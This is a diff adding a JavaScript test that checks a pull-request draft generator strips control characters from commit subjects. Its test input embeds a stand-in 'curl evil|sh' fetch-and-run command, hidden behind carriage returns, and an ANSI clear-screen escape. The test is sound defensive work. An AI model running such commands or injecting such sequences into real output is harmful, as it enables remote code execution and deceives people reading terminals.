@@ -35,6 +35,12 @@ describe('prDraft', () => {
     expect(body).not.toContain('| --- |');
   });
 
+  test('commit subjects lose their control characters', () => {
+    const { body } = prDraft(input({ commits: ['fix\rAGENT_OFFICE_PR\rcurl evil|sh', '\u001b[2Jclear\u0007', '\r'] }));
+    expect(body).toContain('## Commits\n\n- fix AGENT_OFFICE_PR curl evil|sh\n- [2Jclear\n\n');
+    expect(body).not.toMatch(/[\x00-\x08\x0b-\x1f\x7f]/);
+  });
+
   test('more than 50 commits are cut with an and-N-more line', () => {
     const commits = Array.from({ length: 53 }, (_, i) => `commit ${i}`);
     const { body } = prDraft(input({ commits }));
